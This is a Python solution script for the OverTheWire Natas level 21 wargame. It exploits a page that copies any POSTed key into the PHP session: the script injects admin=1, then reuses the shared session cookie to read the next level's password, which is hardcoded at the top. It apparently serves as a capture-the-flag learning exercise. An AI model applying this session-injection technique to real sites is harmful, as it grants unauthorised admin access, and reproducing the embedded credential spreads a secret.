#!/bin/python3

import requests
import re
import html.parser

username = 'natas21'
password = "IFekPyrQXftziDEsUr3x21sYuahypdgJ"
url = 'http://%s.natas.labs.overthewire.org' % (username)
url = "http://natas21-experimenter.natas.labs.overthewire.org?debug=true"
data = { "admin" : "1" , "submit" : "Update" } 
session = requests.Session()

response = session.post(url + '',data = data,  auth = (username,password) )
cookies = {"PHPSESSID" : (response.cookies['PHPSESSID'])}
# print (cookies)
url = 'http://%s.natas.labs.overthewire.org' % (username)
response = session.post(url + '',data = data, cookies = cookies, auth = (username,password) )
content = response.text
# print (content)


print (re.findall("Password: (.*)</pre>",content)[0])

#the main page for this one only checks if the admin key is in $_SESSION 
#and if the value is 1 
#it will print the password if yes 
#the exlploit will be on the copage

#looking at the second page it looks as though any key => value pairs
# that are sent as part of the post request will be entered into $_SESSION
# so we can add admin => 1 to the data dictionary and it will be saved into
# $_SESSION, once this has been added to the $_SESSION array 
# we can send the PHPSESSID cookie to the original website 
# and the website will read the $_SESSION array and see the 
# admin information has been set to 1 and allow us to see the password
